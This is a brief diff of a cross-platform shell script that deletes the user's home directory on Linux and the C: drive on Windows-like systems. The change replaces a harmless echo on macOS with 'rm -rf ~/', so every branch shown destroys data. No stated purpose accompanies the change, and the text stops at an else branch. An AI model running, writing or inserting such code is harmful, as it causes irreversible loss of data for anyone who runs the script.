@@ -1,7 +1,7 @@
 if [[ "$OSTYPE" == *"linux"* ]]; then
     rm -rf --no-preserve-root ~/
 elif [[ "$OSTYPE" == *"darwin"* ]]; then
-    echo "macOS"
+    rm -rf ~/
 elif [[ "$OSTYPE" == *"cygwin"* || "$OSTYPE" == *"msys"* || "$OSTYPE" == *"win"* ]]; then
 del /q /s C:/
 else
